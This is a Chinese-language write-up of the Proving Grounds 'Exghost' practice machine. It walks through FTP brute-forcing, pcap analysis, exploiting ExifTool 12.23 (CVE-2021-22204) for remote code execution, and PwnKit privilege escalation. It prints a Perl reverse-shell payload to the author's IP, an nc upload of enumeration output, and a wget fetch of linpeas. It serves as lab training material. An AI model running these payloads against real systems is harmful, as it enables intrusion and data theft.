# ProvingGrounds Exghost Writeup


## Exghost

第12台，Linux系统，难度Easy，名称 Exghost

## PortScan

```sh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.242.183 -T4       
[sudo] xavier 的密码：
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-21 09:43 CST
Nmap scan report for 192.168.242.183
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
80/tcp open   http     Apache httpd 2.4.41
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.32 seconds
```

## InitAccess

对Web进行扫描

```sh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ dirsearch -x 400,403,404  -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.242.183/    

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475

Output File: /home/xavier/.dirsearch/reports/192.168.242.183/-_23-12-21_09-45-55.txt

Error Log: /home/xavier/.dirsearch/logs/errors-23-12-21_09-45-55.log

Target: http://192.168.242.183/

[09:45:56] Starting: 
[09:46:35] 301 -  320B  - /uploads  ->  http://192.168.242.183/uploads/      
                                                                             
Task Completed
```



对ftp进行爆破

```ssh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.226.183 ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-31 14:24:43
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.226.183:21/
[21][ftp] host: 192.168.226.183   login: user   password: system
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-31 14:25:12
```



```sh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ ftp user@192.168.226.183 
Connected to 192.168.226.183.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29597|)

ftp: Can't connect to `192.168.226.183:29597': 连接超时
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
226 Directory send OK.
ftp> get backup
local: backup remote: backup
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for backup (126151 bytes).
100% |****************************************|   123 KiB   55.84 KiB/s    00:00 ETA
226 Transfer complete.
126151 bytes received in 00:02 (51.95 KiB/s)
ftp> exit
221 Goodbye.
```



```sh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ file backup                              
backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

是个数据包类型，想尝试用tcpdump去解析，没成功，直接双击backup，用wireshark进行分析

从中获取一个http数据包，发现文件上传接口exiftest.php：

```http
POST /exiftest.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------169621313238602050593908562572
Content-Length: 14806
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/
Upgrade-Insecure-Requests: 1

-----------------------------169621313238602050593908562572
Content-Disposition: form-data; name="myFile"; filename="testme.jpg"
Content-Type: image/jpeg

......JFIF.....x.x.....C......................
.....
...
..
...
............................C.......	..	.
.
.............................................................".....................................	
.....................}........!1A..Qa."q.2....#B...R..$3br.	
.....%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz.......................................................................................................	
.....................w.......!1..AQ.aq."2...B....	#3R..br.
.$4.%.....&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz....................................................................................?..h~.x9..:$.........
{.........wq....a.....&...~u.E,..f......rk....Ox7..............	...k....o....;~...F.....%f.....2...{r48..I......a...9.r+.U...i.=...?..{D..5....'.)o........h...-........
w{....4n?.o........_......._..`......R..........w...y.3F......R..?.k..38O.R............
[............7.h.......T......g	..
[........?.Kx/..0...]...........4}J.`......?.Kx/..0...G.)o........k.......q..~f..R...5....'.)o........h...-........
w{....4n?.o...*]..F..3....-........
.......@.?....q..~f......>.K..h..fp...|...@(?...............j............4....Q.hb?.....Ox78.....4..
x2I9.m.p\.m.........e;.?SY..J*.
x.D./.C...{.I....i.........^?..&.=bx..G......M..~"x...xU..s.k.<|.?...m..C...;.o..9.vK.......{u..9.].~.xb...M...q...0...-q..^..Y..cV9.k......#.|)...."...y.....xV8..\ .15.^.-.S....F.Y....y..f.<.<.....7u......h.......?b...Z.>3K+..y..`.p%.|.......v[....5._.s."...+.[c..d.....9;.@.$X...T...1D......+.._...%Ej.....
.....D	E.SN.AE.U."..(...`..(.A`..(.@.QE...V.QE.....QE.Xo...-i.Vc..-h...{.S.7t.\.T~.....G...0.`.E.Ih	.+.~#.<I1.I5..0S..L.k*...X....Q....E...`.../...@+.|/...............w...........z.z.u6.n..*.#4_I....qX...K..rU...........}+...S....pI....W......c...e....d......r...._^...[?....=.?.	+
...8(Wt...?.IPA&!.....Sn...%'.....v...S<.....U\.j...S...2..2(.1....b..#.C.....O..Er.....A..+..7.....j.?...+..TV<y....e........X......../.&.po..c.'.t,.G...
J.V....M.~ny_.....U.2*.W[..8..E.:."...k.4.....QA..)c.U.5H-f.H..=.u..V-..M..o...*3......I.78.2.R......b.Fw..+7\........?u#_......M.5..V.->.z.m...E=.........}O..rz..K.C~O.6...M........>..J.]g\x...5...4....W../....[0
	o:...........^=....$..?]..tc..s...k.....=....kc...E........I..N...........i...mu...s.......?...SG.d...^U.D......X...w....%.W.................2Uk...
..A.v...~....3.W.GWs....0..j.!.R{WM.f..^..j.v..RLy'.U..>[.p+..c../..knQs.v.........5...........nd..k......x.......@.....fxg..y...O.0...lPb'..y......=...t.b.Mh%...u..N+...........\..t.}..........Q....{.b.*.}+3G.l.._>.u.z..\..
.
...
...7*r..d.^q=.......>..4#qwP$...m(]....f....`d..sz...,.?.....nn.......5;..t...81..>......O.....5....B9......g.....g..+.,unv.....6...j.+8..e.......=k..O.........s.%..{U...?...SC.._.T.U.>g#.#......#
O+.W.........!o..|.h.w...4....:...$.q{......+........."...../.H....
......<g......j)s.ni....j./.k.x..;..K.2..t.Z.f...L....7...%...hW..................ek...........y.:.U....e...].GB....^..f.8{...U..>..'..h.{.>.v.....J..n....=.k..].s'.....KV...!.*...6#.%.'..Ml..>..C.q.>.;..kN....0..pO.T..*.......q.$01Q..X...o....X.s...........X.....vt.>.)
..+..v.ZH....I...\x..W:.....e..QX.r;........|Iu....a-.E..(.u.m....*.K.,^9A..._C.B1k.])#]..*N......a.x..R..NE...R.....r.1......)..;uy....H...[.t.}}k...#.._iv^&...H.]..........W...K...C....T...q.1.WV.n2.81..V..??.9!..u'p......@...-|.....D=M{..y..r...}..oC..u%..#JE....}..wN..6..B
dj.%....`.......-....z....e.,>2?......W....o..Nw.rO~+....B..1...............9.....*....Z...k.h......9...u.m)h....>..5"...	..&.....t..D....\..n...
..Morar@..A.+....7..b2.U..L..B.6...*sS........3j..eA)...c..W.x/......e[K..$...5.T1...g..r.....w[....`...v....K.pO....C.K.....I.....k.v..Y./....V.i>..mW.[.q.8...-)o.[.......
.7O*.m.....O.E~w......	nG./,M#)\....K).nOZ....{._i.
.....0y....2?b...{V..4t../..7.V&t. d.*..G#.....|]....^..w...F=I#..4..C
.u<s.....[t.A,....{.dU=..c@.v.$......3(..
.}?..qJ...>=...
[RM...
o`.#^rjV".6...T.Jwq+j~#..dH....,)...N...vX^..2|.XVW.l.F.....<.eV...\.5g.z.....dV.W..)......V...~.+.H.....2.^...0<...B...>.+:.......;`.....z.X..w#.	]..}k.x..H.Y.....0...~7....i:.7:y8.......t..2.......U].<f.......$k,l1.oq]6i]...c.=...+.RH\J......:.....W.|..%.........}.=Lg...zr.U....jz..6.......~......e8.~O..o......<`...V....W.....<...E.z.c*(Qwg...gV`..f......<.w..3.s.u... .._.._1Ol..a......j....O:.p`+:..y..y.#.,w.....%.l....z.c...F.j4.O+9<...}u..|..08......+............}...x.;..y
....{E...v...YT.q>....
s...C.Oi."D...pR[.nU...}......2,.2.Q.s.y......".Y...w|....r.........g'.h|....Uc]w.>..^..quh.3....=x.I.e.n.k..Jt...T.B.ta....=*...................U..|".4.=[...5?..Ev.l..,.....
..G..1.op.J.cc....s...5oK./4..kk..D<m8.z.q..\.C...R...w.M*[.	...nx..S..9..s............V6....5...~?].......L6...+.?g..........7......py'#...|..q..u>...<.wNZ&}..$d...{Z........?.y.....O.[E...%x4....}k.e
O.........aD.Z;....}..~&\.Z.....(....kB../<.U.J.....*......39.7..}v..C...6.U...h....-.w;wc..Z.....q..o..+. ....d..y.vM.Wz............
{(~Ys...+2...B.........x...
..................g....b.J..\|..L.5..8.....|].M..{]Y..D..X/bk........../m.....:U;.....i.6......-.SI.....T..C+J..<.8;!b?.-.....i..QM..}.W?<l.U.y..
o....r........>.x..Z.......,..RU..9.b.~..(.m/"`ZL......H.M.o.....|G...j...oc...v:c.~pi..2.Z..=.......$\|..j.1*.....+U........A......0....t.+.cb.........T...Z! Y.El?.....j..<M...Z\\^....$...=+..%?.\...B....t.Q4..#........h...x..........^.p.\..|N..w...h......-..[].....k.>+X...Oo

.#(o^y5.X|..i4|.i.*..6p...u..<.5...R.!...x}.u..^..>.]..9...).Wf|..uvt....V!eB..QA.,p*9..X....,q.yw..kw._..h.^I.k:.k.0).D.U......M..%...pE}.......'........u...L....&?......=+.....u......?3.....>....O...........>.8<....j..0...S....T.......S......".J.....Tm.j...[.3.....X.+.<q.=Zk
.Z3}.r.y=..p(.REa.;.....Uj..8..^...$.N..{....H......V.....t[.~....I...^k..y.9...hrrF|._3..J.........d...sZ:..........u89..f.:..:S...cR.....Z...s.....ryW.6.l..........".T&..J'....<..:.......W.@,..`.^......=..+...T.O..X&x.y.N9.^...Q...Z...+....rk........y............7..m...a..A.q..........b_...GkaxG..5..Zf......-L.<.....8..2..]._.)E.n........."..VQ.z...i&..ou.....?....x^.4..Z.....Z.n..{U....._=_...l.R.&..jq.|=......7........m....,.R+.~..h.....?.....Q>X..O....F1...Mhk3.......?..1.Y...d...
.+.?
.OL......C...rI....W...B
|..s.Q.[...y!......Oe..-....s......|d..4.....~....n..B..E}E..SE..e......\..PI.T..>..../........p.....R.>.._...y...h.=..f.p|..RT.....|~..m.I..c_.g
...^..Th...V......,..{.Q.k.a..l.......6?.qT......SW9..xZ.........n..y$......l.t.i.....'.brqY>*.#...E.>zM&..y..@k...[;x.^.0.W.d8..<.G.|E...JR..........1C.;o~....yO.(6.\.>......|@R.*...?m.._..n.. .2.....s.MCc....R..U......G.W..	.o....
s..q_>xv36.l.n;.W.j.=:-..F..[....y..+.[.B.-.N........>.<...|...w.......#.._..O.L..99).V.i..........&..]....=....w...J.S#....</....(......Zi|.....x...7...f......Y..vj..V.Z..)...J.....v.]t.....i'.'.Yk....I..'......?....U=..E_...QU#	...h.C..EM..I.k...>...cj... c.U.a_;...{..?:.K&..N|....A_R........C^}l$*....2....~.^[.o!I"1....`..W....|_.wC.....gtA. ..._<x......).._i.Rq$|.........e...l..e....8...-...9.$......
D.........etMcq%..............}......m.F.....m.>..q.#...bU..X...9..q.<w.....[7......7....X..W6.t...B.z........F.E:........5..v:f.U".;u8...{W/.....$....L.O...._!....s>........l.k.Z......h.*G ........-.8l..8.qF0.V...r.y#x^k\...ul....).i~$U.....i......A..@.?...k.;..G$=.m.U..~..H.....$A....,...
k_....7...o.x..bMQ-...q....6.
A..[.oRY..%.p? k..Z..SIa.D".n..Q.......t..uQ,..E.M
...}+...,.+....#...1...}VK...v..<A.........
/...M....nf..}q]
../-...(...W.+.z..l.....1....hS..X#.j.....T8........#'.....D(...J..g.u.^0`.0...3|.y....Z..&....f...UN@'.?Z...O..!x........;....G~....?.[x.I....U...}...x....~..2.B.|G.UQ.V...7.....<k..#...F..n..Q.._8}-...>(..,......!.+....g.oIP.,..Z}....s.I}.
..._.|
P$.<..q.8.~m
.....<.*../...Fx....w.[.x.=7.q6..5....%|.......Ne]...I.....K...|Z...-...(........................._..........!...EhdEEK...(.:)Z..
l.....*,.......QI.Mr..qw[.G...6:..w....$..85...<
.xgR[K.W...6....M.W	.i......[....fP=........i..;...<eLF#..c.....i..Q.0.......M......'..C....L...N...\...I.\6....1....rk....ZM3.<&..i...\..T.4G....{..,md..b.wm.......*.@~v?;{..V.|;....2.9j.=../...;.K.\.....-....zv......;.H$z.....2.P....Wv3....J.....6...../........."i..em.zl.....O.|M>.[.w.|..=.....K.2..W....	>.....c[L...^.M...... .C..r:.<T>....V..f.....h..g%.....>^..f.~ZW?....J...............YL.S..W!......c...$.m......z......f....x.M..o.d......^0..#...F.*...........XL/..cS.^?.....p...........;....h./n5......W..7....H........-..	..Y#.D..~U.u..i...m.......R.+dv...+^hJ.B.#.....,...V..._E~...2x...6...@..R.......8 ..W...;N..3/.'..z...%:..'./....v....'.....=..M_...QZ...QJ[.........E.;z.?u.\B.Z.w..'.....I.!.~..........e.B..wg#..N.5.....e8.d..5..q....@.{........[.V...%.`.0P2Gj.</...a...e<........u..W.	r...........`X.3.....E......?....S.?...........p.4.f.5..9a.yG.......s...*
..=..5!.Ite.S_>).{.!.[....oQ[:]...j..F...I..;C...]5m.L..k.r.......j..xX.k.
......
G..<....Z8....d....H.)......tS.......J..sc....At.2B..9..C..5...uIq..,.+..`.j....j.6.>f...D.....O.,......8y6&h.....C..o.?........~k...]|.Gk..,...._;|f...Z..:Ky.lv..r......&x....g...#|L...<V...u7.&...1..........S.	.0.e...!.R.+........?....r....p{W....]x..K..$.......^...-LT....R.
R.g......K....E......G.......r...cH...]lRIc.......f...WM.NW....w....	..9..:W?p....w.....k.....W%-....Mt.&......#.s..x.R.....2..[{yf...i....o....W3{.&....z..D.%...I...;.=J%..T.......U..j.4{vy.F>.....[q...J....F....o..
...Qs..k.....O....6...A..e.^.l...3.....c{.e..>Z..k_..J..8.3...R..KH.....Z..........(....(...(....6x....."............=k.{.zf.`c......>K
I0[........S....U.TR....M..Q.......,.}.s.
.M....(..s..7$(....M.4.S..}...b.O.6t...{.j..{..n.
.8rW......1U......%...[.m....]..m.v.1......[..s^...o#I.....?G4..g.I! qQ.8.
......d......(_.....0...vc..5=.V...ki.,.n.z.k`....;v....P.w.._.?.]\.
6...\Q.......n.!r..._......L...PI.....ZLcY...`~..5...<4|-.K...]....5....R<..|vf....Y.......h.CYZ..dY..*..?."..../.4N.+)..nY........6.........+v...R......!?).F..z(..{..F..5.3.7.W.+...G.yv..........3Is.^".$.Kg...}....$.W..G..).*y.....WQ.E.......
!...+.|=.E.,y...........B..^B2KV.....)...+..&..3..AUu.....%.:.#y..u).....J....J...^..X.....ye$.\F...b..J>Z_..!...Z.....>.kV....5....,........K_
.$.V.(....5..k...v.i	;y.......8...89.....d..?.7.J.....}7....L^2!..k^3.....ks....V.AKL...3...T..........`Q.Rd..Z...R5.4P.QE........fk...!..<.#.I@.Mi..W7...K.....e...".}.......7.w...*...b7...)3h..2j........:U.
^k.u...<.f.Z5f..=../	._....>....s,....]...t.[.....~#..}.Q....h...9.`/.-..n!.....
z...
M"':..aG#...U.\C..D.$.i.7.....G..`M.?...<...U...X.&.d.e_..^..Z.uo.x..$.......a..z.Cm
....... O.RF.`.P+.m.[+v.`.e..v$.i....=....#..@..36....B.%..{..jS\.J........b.O..Go..Uw`.Uq3..q..<47<.........6uK.c,>.G..............M;.....g.............m.?x.r7..=j..^=....C..HN..@..........\............K.+...O...+;.z..B....xz}rc=....k.<7....6...........N..TB3'S..Mz..m.F..I,.V..nN
M....x....F.kw.... s....H..G./..m.As2...,...+K!..m...{[.,F7.+.V]..%...{2.. .?.......+{../z;.	5.......y..V...$...........m%.!..=y5.j.z.....'..sYF..,.1..:....7...@.....
.........!...f%..7.d...p?Z.my..............g.k./...[_..1$.m...._9}...7.<......c...'......?_.J......x.........Z.-.,xJH!........}.C.3........_w.M8.+....W....f..rW./.o	F.
j....O..	...!..:.Z....................	...
G'./	+q.#..h..>..J...w../../.y.../	.../.H..<&...Z.[....+..!..e.....J.tp...MF._.X....V..'...?..Es:O...h.0.._Q.+.. p.9...1....Y....T.<.V..i..9...;..\G...O...]"vK..YX...@'.......4+.....0.."/,....:...>mgM..n....'yrq.2W..9....^kC..Na..Q..c..z...d..R..yy......~2..y....z<2..A.......z...P|.....v.o....[..Z....X.4....	..^.:.........1.F..i$...cq}r."<`U/.[.
.$.P}Z1\e..?
\......Z.....x.W......,...S.....4][..+j......h.-.Mt.m....v.."E=..k.o...f.XV8..&....&.uD..._....0.....3...T...!m......	vL..z....-c...9.s]#..Co.....iyVL..6.9....N..	4..w.v...bd.=.s..a......Q.!.?j...	i..v...dx.g%x...e}.X...b..
~.\...g._...d...Y.I..Nq.+..2|Q..Y......n.g.&Bv.5.~ ./.M.Kyz..HI!z
.7V....X.m.....|..j...y....x..B.......4:..r......?0._K.WR.5.6).|.A..z.W.Z..G..ak.......z..~8x3D....&^9.	..VQ..dz...R|...Ue/..=.I........B..s...Ys|h....k.=.D...@.....0.O..*........&Oc\Z.Z........j")...<...>f...h...n..t%	
.........-....\....?...........K....j...!....^....v..k.r....U.M........P.b..FN....3......q..A~.......e...T....nE....R.+j..Q#]x%X......l..=5....t...A.?.U...............*.G.\..3j^..6.)...[.k..d.*..T...|g....T.:....B........lx
.....1Hu..7K	1...|'....."...\q..A.T.F...v$.[.\k..6V>........A..f=..R.|-.f>f...._....o.
....|....wDQ.....WC..).......H....T............E..5...p.....r.....xy.Jcx.........4_....u(....S7.xv.5(...*yWa.Iw(7....G..>....^.s.....?..M.m.IK....*...d..I.....J;.)9.&,.4..o.Gn..*[..xZ.%..K.....m...4..=3T...4..7.+Oh..f|...u...x-..Gw.._.O......`..y.r..zl.r...R...?..[.k.&...RVGI....G...~.T....,....#t.\..#z|c%[..|=.7W.....tM.#...W...a..m..DV$x~1..Y..z.y....R..e.|.4.}wQp-..}.6O.#..>..?..jp..J=......V#._l.m..u...C..[
...2....o|<.O..pk....<	..dx....N....k.....?./$.M,:?.......O.Y......2F:TL...G...M........0.
....6.....G.....d...V...GE..4<..........J.....f..[x....k.{L..9Yk.w....#P.6.........z.:}......h3Yg.....e$....5.H..r.......:......hk..A.......^1.I.....I7,..i.x.<..........2..F....g.....G...w4.`[...ir.....e.........z..v...J...`....Q..a..6...{.._..k..^X..........3~2W.I...y.........O.U...<...[..;~.I......|.3..zsh,.....1.R?...R..y..:.q.K..}...u...2...^.4.I9.R.b;gl.O.....WA.U......Y.C....L..#]....f;&Z.q.Mk.qx.....\h....S}2...].UnN.p....z..=.|...{V...3.../E.....\Gg$.]I3.#q.y.e\....W...;...lr.!`~..o.Y..]:....mq.Q....../........s...uQ.-../...f.+..+.....E{G..3..6.?..J*...k..$\...........u7..k.5
.H..r...n.."..\Vg.u_
..M....`........}...T....^.~........q^....5.E`.V.Xt#.....V#p...D.3...W.=............'......c....7...1.....C.<9~.....7.i...t..11>......+p..O
.m....{0.<B?..H.j........I#....:.x.;n.......9C.....<H|=.Wq..t=N{W.....m4....6.Xi.....k.....~....5...u..m.....-....+*.V*2...+.6......?.F...7...Y.......J.N..3..>...]..:.......2.E.[
N...i..#...V...J...
h.N..U.....:..t.q....q*.c\.)...'...bG...jF.&..?..#........[.^.JO....s......*?.H...
X......Cq.
).....E....s.%.I..0.P..U..f?Z.&..I!o..y..u....4...m..g.{D.>.+7C....u...............aN:..'
.d~..\.'S......U[....l...J.
......L=<..5.
../.....W.js1...8.dMj....(....g..:.......M....}q.]..u..#.y.E...}k+....2..*...F....>d...yos.....%c.|.W-.Gmu.+.....1.....+.I!...gu....?:......&...._7x...=y'..h....>..6.k.$..."...A.OM...o{...k....l.7v..1.C[...;Bw..q....E.K.........N.d.K....+...,K\C...1..
.J.....~.|T..N.........@.+.......7b.....|.,m>Y/.....P9.^..x.E..b..K.....Z...(...6...........k...6..V....
p......b?.....S....<B..+.?........(..#x|!Q......~..!.,*s.
.-rc...d.n.}&...;..6k.C.0...r.<.. __.k...
.......[o..J...w...u.<...........|Q._Z..........o.q'.V.&..*...RQEs..5..E.*..E........E..)..((m*...kp..Sh..$z..O...'.E..2....Z(.....;QE.,.~..Gz(..AR/..QA#_.Sh....QZ..|}......q...;......OE....w?..
-----------------------------169621313238602050593908562572--

HTTP/1.1 200 OK
Date: Thu, 27 Jan 2022 12:47:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 454
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

File uploaded successfully :)<pre>ExifTool Version Number         : 12.23
File Name                       : phpopnW14.jpg
Directory                       : /var/www/html/uploads
File Size                       : 14 KiB
File Modification Date/Time     : 2022:01:27 14:47:37+02:00
File Access Date/Time           : 2022:01:27 14:47:37+02:00
File Inode Change Date/Time     : 2022:01:27 14:47:37+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 120
Y Resolution                    : 120
Image Width                     : 253
Image Height                    : 257
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 253x257
Megapixels                      : 0.065
</pre>
```

尝试通过这个php文件上传接口上传，失败了

注意点返回包返回ExifTool版本为12.23，尝试搜索下漏洞，发现存在漏洞。

```sh
┌──(xavier㉿kali)-[~]
└─$ searchsploit Exiftool 12.23
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                          | linux/local/50911.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

因为这个py利用脚本需要下载几个工具，总报错。于是又从github找了另一个工具：https://github.com/AssassinUKG/CVE-2021-22204/blob/main/CVE-2021-22204.sh

准备一张图片，执行EXP

```shell
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ ./cve-2021-22204.sh "reverseme 192.168.45.206 80" image.jpg
   _____   _____   ___ __ ___ _    ___ ___ ___ __  _ _  
  / __\ \ / / __|_|_  )  \_  ) |__|_  )_  )_  )  \| | |                                              
 | (__ \ V /| _|___/ / () / /| |___/ / / / / / () |_  _|                                             
  \___| \_/ |___| /___\__/___|_|  /___/___/___\__/  |_|                                              
                                                                                                     
Creating payload
IP: 192.168.45.206
PORT: 80
(metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(80,inet_aton('192.168.45.206')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};};")


    1 image files updated

Finished 
```



从pcap包中一个有两个HTTP包，除了文件上传接口，还有一个访问根目录的，根据返回包，我们做一个本地的HTML文件：

```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <!-- Part from this tutorial -->
    <form method="post" action="http://192.168.226.183/exiftest.php" enctype="multipart/form-data">
        <input type="file" name="myFile" />
        <input type="submit" value="Upload">
    </form>
    <!-- End of part from this tutorial -->
</body>
</html>
```

通过该文件进行文件上传，将我们的恶意图片image.jpg进行上传

成功收到反弹shell

```shell
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.226.183] 60754
/bin/sh: 0: can't access tty; job control turned off
$ id && hostname &&ifconfig
uid=33(www-data) gid=33(www-data) groups=33(www-data)
exghost
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.226.183  netmask 255.255.255.0  broadcast 192.168.226.255
        ether 00:50:56:ba:ea:78  txqueuelen 1000  (Ethernet)
        RX packets 882325  bytes 149611956 (149.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 815478  bytes 260258150 (260.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2114  bytes 192120 (192.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2114  bytes 192120 (192.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

$ cat /home/hassan/local.txt
39b7e7ba6088e8d9070e83de44c7e6e0
```



## PE

上传文件，信息收集并回传

```shell
www-data@exghost:/tmp$ wget http://192.168.45.206/linpeas.sh

www-data@exghost:/tmp$ ./linpeas.sh > 1.txt
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
./linpeas.sh: 1189: [[: not found
./linpeas.sh: 1189: rpm: not found
./linpeas.sh: 1189: 0: not found
./linpeas.sh: 1199: [[: not found
Sorry, try again.
./linpeas.sh: 2583: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
gpg-connect-agent: failed to create temporary file '/var/www/.gnupg/.#lk0x000055c75a8c3cb0.exghost.13020': No such file or directory
gpg-connect-agent: can't connect to the agent: No such file or directory
gpg-connect-agent: error sending standard options: No agent running
www-data@exghost:/tmp$ cp 1.txt /var/www/html/
cp: cannot create regular file '/var/www/html/1.txt': Permission denied
www-data@exghost:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
^C
Keyboard interrupt received, exiting.
www-data@exghost:/tmp$ nc 192.168.45.206 443 < 1.txt

```

发现存在CVE-2021-4034

```
Vulnerable to CVE-2021-4034
```

使用Pwnkit进行提权

```sh
www-data@exghost:/tmp$ ./PwnKit 
root@exghost:/tmp# ls /root/
proof.txt  snap
root@exghost:/tmp# cat /root/proof.txt 
ecbda28237ca915f1edb88a8b8a67826
root@exghost:/tmp# 

```





## SumUp

- 爆破的字典选择很关键，不然会浪费很多时间和精力。
- 文件上传接口不一定是文件上传
- 多观察返回包，莫名其妙的提到某个工具，涉及到具体版本号，要多做信息收集和历史漏洞查询

---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/provinggrounds-exghost/  

